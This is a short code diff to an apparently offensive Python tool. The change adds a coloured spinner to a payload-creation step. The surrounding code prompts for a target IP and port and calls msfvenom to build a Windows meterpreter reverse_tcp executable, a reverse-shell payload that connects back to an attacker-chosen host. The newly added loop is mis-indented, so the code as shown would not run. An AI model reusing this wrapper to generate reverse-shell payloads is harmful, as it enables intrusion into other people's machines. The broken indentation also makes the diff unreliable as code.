@@ -9,7 +9,7 @@ BLUE = '\033[34m'
 YELLOW = '\033[33m'
 RED = '\033[31m'
 END = '\033[0m'
-
+spinner = [f"{GREEN}|{END}", f"{YELLOW}/{END}", f"{BLUE}-{END}", f"{RED}\\{END}"]
 #BANNER
 dreamscan=f'''{BLUE}
 
@@ -103,7 +103,10 @@ def main():
            output = input("Enter a name for the output file: ")
            lHost = input("Choose target IP: ")
            lPort = input("Choose target port: ")
-           print("Creating payload...")
+             for i in range(40):
+           time.sleep(0.25)
+           print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
+           
            subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output])
         elif answer == "n":
             print("Payload not created.")
